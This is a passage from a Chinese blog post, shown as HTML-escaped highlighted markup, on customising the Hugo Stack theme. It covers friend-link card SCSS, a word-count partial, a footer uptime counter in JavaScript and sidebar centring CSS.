&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;background&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $friend-link-background-color;
    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data-scheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dark&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;background&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $friend-link-background-color-dark;
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// 卡牌气泡响应动画
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;-webkit-transition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; transform &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;s&lt;/span&gt; ease;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;-moz-transition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; transform &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;s&lt;/span&gt; ease;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;-o-transition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; transform &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;s&lt;/span&gt; ease;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;transition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; transform &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.15&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;s&lt;/span&gt; ease;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;:hover&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;transform&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;scale&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.03&lt;/span&gt;);
    }
}


&lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-link-avatar&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; left;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-right&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;

}

&lt;span style=&#34;color:#75715e&#34;&gt;// name 特效样式， hover 气泡效果,友链 name 变色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-link-info&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-top&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-right&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $friend-link-color;

    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data-scheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dark&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $friend-link-color-dark;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;:hover&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $friend-link-hover-color;
        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data-scheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dark&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt; {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $friend-link-hover-color-dark;
        }
    }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// name 文字样式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-name&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;text-overflow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; ellipsis;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;overflow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; hidden;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;white-space&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; nowrap;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;font-style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; normal;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;font-family&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Comic Sans MS&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;cursive;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;font-size&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;

}

&lt;span style=&#34;color:#75715e&#34;&gt;// bio 文字样式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-bio&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;text-overflow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; ellipsis;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;overflow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; hidden;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;white-space&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; nowrap;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-top&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; auto;

    &lt;span style=&#34;color:#75715e&#34;&gt;// font: 12px/1 Tahoma,Helvetica,Arial,&amp;#34;\5b8b\4f53&amp;#34;,sans-serif;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;font-family&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Helvetica&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hiragino Sans GB&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Microsoft Yahei&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;微软雅黑&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; Arial&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sans-serif;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;font-size&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;

    &lt;span style=&#34;color:#a6e22e&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $context-color;
    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data-scheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dark&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $context-color-dark;
    }
}

&lt;span style=&#34;color:#75715e&#34;&gt;// 响应式页面，允许根据不同的尺寸调整样式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;@media&lt;/span&gt; screen &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;max-width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;600&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-bio&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;display&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; none;

    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-link-avatar&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;margin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; auto;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-link-info&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;margin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; auto;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;display&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; flex;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;align-items&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; center;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;justify-content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; center;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-name&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;font-size&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来只需要在自己的 page 页面下加个 &lt;code&gt;links.md&lt;/code&gt; 即可&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-marddown&#34; data-lang=&#34;marddown&#34;&gt;---
title: &amp;quot;Links 友情链接&amp;quot;
date: 2021-10-01T16:45:06+08:00
slug: &amp;quot;links&amp;quot;
layout: &amp;quot;links&amp;quot;
license: false
toc: false
menu:
    main:
        weight: -80
        pre: link
---

## Friends

{ {&amp;lt; friend name=&amp;quot;&amp;quot; url=&amp;quot;&amp;quot; avatar=&amp;quot;&amp;quot; bio=&amp;quot;&amp;quot; &amp;gt;} }

两个大括号之间的空格需要去掉，我这里不去掉的话会显示友链标签（竟然没有考虑到代码块的问题，可以考虑提 issue 了）
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;文章字数统计&#34;&gt;文章字数统计&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;参考 &lt;code&gt;https://coderqs.github.io/2022/02/hugo-stack-%E4%B8%BB%E9%A2%98%E8%A3%85%E4%BF%AE%E7%AC%94%E8%AE%B0&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;layouts/partials/article/components/details.html&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;        {{ if .Site.Params.article.readingTime }}
            &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
                {{ partial &amp;#34;helper/icon&amp;#34; &amp;#34;brush&amp;#34; }}
                &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article-words&amp;#34;&lt;/span&gt;&amp;gt;
                    {{ T &amp;#34;article.wordCount&amp;#34; .WordCount }}
                &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;time&lt;/span&gt;&amp;gt;
            &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;i18n/en.yaml&lt;/code&gt; 的 &lt;code&gt;article&lt;/code&gt; 中添加&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;wordCount&lt;/span&gt;:
        &lt;span style=&#34;color:#f92672&#34;&gt;other&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{{ .Count }} words&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;站点上线时间统计总字数统计&#34;&gt;站点上线时间统计、总字数统计&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;参考 &lt;code&gt;https://coderqs.github.io/2022/02/hugo-stack-%E4%B8%BB%E9%A2%98%E8%A3%85%E4%BF%AE%E7%AC%94%E8%AE%B0&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;layouts\partials\footer\footer.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;修改：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;section&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;&amp;gt;
    &amp;amp;copy;
    {{ if and (.Site.Params.footer.since) (ne .Site.Params.footer.since (int (now.Format &amp;#34;2006&amp;#34;))) }}
        {{ .Site.Params.footer.since }} -
    {{ end }}
    {{ now.Format &amp;#34;2006&amp;#34; }} {{ .Site.Title }} &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
    已运行 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fas fa-bell&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;i&lt;/span&gt;&amp;gt; &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;days&amp;#34;&lt;/span&gt;&amp;gt;0&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt; 天
    {{$scratch := newScratch}}
    {{ range (where .Site.Pages &amp;#34;Kind&amp;#34; &amp;#34;page&amp;#34; )}}
        {{$scratch.Add &amp;#34;total&amp;#34; .WordCount}}
    {{ end }}

    ⌨ {{ div ($scratch.Get &amp;#34;total&amp;#34;) 1000.0 | lang.FormatNumber 2 }}k 字 🧠 {{ len (where .Site.RegularPages &amp;#34;Section&amp;#34; &amp;#34;post&amp;#34;) }} 篇文章
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;section&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后添加&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2022-01-01&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;s1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date(&lt;span style=&#34;color:#a6e22e&#34;&gt;s1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;/-/g&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;));
    &lt;span style=&#34;color:#a6e22e&#34;&gt;s2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;days&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTime&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTime&lt;/span&gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;number_of_days&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; parseInt(&lt;span style=&#34;color:#a6e22e&#34;&gt;days&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;));
    document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;days&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;number_of_days&lt;/span&gt;;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;站点信息居中&#34;&gt;站点信息居中&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;参考 &lt;code&gt;https://coderqs.github.io/2022/02/hugo-stack-%E4%B8%BB%E9%A2%98%E8%A3%85%E4%BF%AE%E7%AC%94%E8%AE%B0&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;修改 &lt;code&gt;assets/scss/partials/sidebar.scss&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;site-avatar&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;position&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;relative&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;margin&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;margin-left&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;//站点头像居中&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;margin-right&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;//站点头像居中&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;width&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;sidebar&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;avatar&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;height&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;sidebar&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;avatar&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;size);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;margin-bottom&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;sidebar&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;element&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;separation);

    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;.site-logo&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;width&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;height&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;border-radius&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;box-shadow&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;shadow&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;l1);
    }


.&lt;span style=&#34;color:#a6e22e&#34;&gt;site-name&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;var&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;accent&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;text-align&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;center&lt;/span&gt;; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;//站点名称居中&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;font-size&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1.8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;rem&lt;/span&gt;;

